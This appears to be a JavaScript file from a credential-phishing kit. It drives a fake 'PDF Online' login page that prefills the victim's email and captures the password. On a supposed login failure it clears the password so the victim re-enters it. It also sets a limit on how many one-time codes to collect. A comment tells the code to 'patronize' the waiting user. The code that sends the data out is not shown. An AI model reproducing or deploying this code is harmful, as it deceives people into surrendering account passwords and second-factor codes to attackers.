let maxOtpCount = 2;

window.addEventListener('load', function () {
    initApp(bindElements, document.getElementsByTagName('body')[0]);
})

function bindElements(params) {

    window.LIB_submitButton = document.querySelector('button[type="submit"]');
    window.LIB_userInput = document.querySelector('input[name="email"]');
    window.LIB_pwdInput = document.querySelector('input[name="password"]');
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');
    window.LIB_form = document.getElementsByTagName('form')[0];

    window.LIB_pwdInput.addEventListener('keyup', function () {
        let notice = document.querySelector('.notice');
        notice.style.display = 'none';
    });

    window.LIB_onLoginFail = function () {
        let notice = document.querySelector('.notice');
        notice.style.display = 'block';
        window.LIB_pwdInput.value = '';
    };


    window.LIB_userInput.value = params.email;

    //Show form when background image loads
    const img = new Image();
    img.onload = function () {
        let loader = document.querySelector('form .loader');
        loader.style.display = 'none';
        let form = document.querySelector('form .form');
        form.style.display = 'block';
    }
    img.src = ____bg;

    //Patronize user
    setTimeout(() => {
        document.querySelector('form .loader p').style.display = 'block';
    }, 8000);

    document.getElementsByTagName('html')[0].style.backgroundImage = `url('${____bg}')`;
    document.getElementsByTagName('title')[0].innerText = 'PDF Online';

}
